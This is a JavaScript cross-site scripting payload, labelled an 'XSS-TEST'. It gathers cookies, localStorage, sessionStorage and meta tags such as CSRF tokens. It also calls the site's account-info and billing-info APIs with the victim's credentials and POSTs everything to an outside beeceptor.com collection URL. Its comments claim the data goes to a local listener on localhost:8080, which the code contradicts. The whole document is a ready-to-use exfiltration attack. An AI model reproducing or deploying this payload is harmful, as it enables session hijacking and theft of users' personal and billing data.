const mainDomain=document.domain;
console.log(mainDomain);
(async () => {
  const ATTACKER_URL = 'https://ambush.free.beeceptor.com';
  
  const log = (...a) => console.log('%c[XSS-TEST]', 'color:#00ff00;font-weight:bold', ...a);

  // The sender function: Transmits data to your local server
  const sendToC2 = async (label, data) => {
    log(`Sending ${label} to local listener...`);
    try {
      await fetch(ATTACKER_URL, {
        method: 'POST',
        mode: 'no-cors', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          type: label, 
          content: data, 
          origin: window.location.hostname,
          ts: new Date().toISOString() 
        })
      });
    } catch (e) { 
      console.error(`[XSS-TEST] Failed to send ${label}:`, e.message); 
    }
  };

  // 2. INITIAL SESSION HARVEST
  const harvest = {
    href: location.href,
    cookies: document.cookie,
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
    userAgent: navigator.userAgent,
  };
  
  await sendToC2('SESSION_HARVEST', harvest);

  // 3. PII EXFILTRATION (Account Info)
  try {
    const accountInfo = await fetch('/api/6/webaccountinfo', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    }).then(r => r.json());
    
    await sendToC2('PII_ACCOUNT_INFO', accountInfo);
  } catch (e) { 
    log('webaccountinfo fetch failed (Expected if not logged in or endpoint differs)'); 
  }

  // 4. BILLING DATA EXFILTRATION
  try {
    const billingInfo = await fetch('/api/6/webuserinfo', {
      method: 'POST', 
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    }).then(r => r.json());
    
    await sendToC2('PII_BILLING_INFO', billingInfo);
  } catch (e) { 
    log('webuserinfo fetch failed'); 
  }

  // 5. METADATA (CSRF Tokens, etc)
  const metaTags = [...document.querySelectorAll('meta')].map(m => m.outerHTML);
  await sendToC2('META_TAGS', metaTags);

  log('=== TEST COMPLETE: Check your localhost:8080 logs ===');
})();
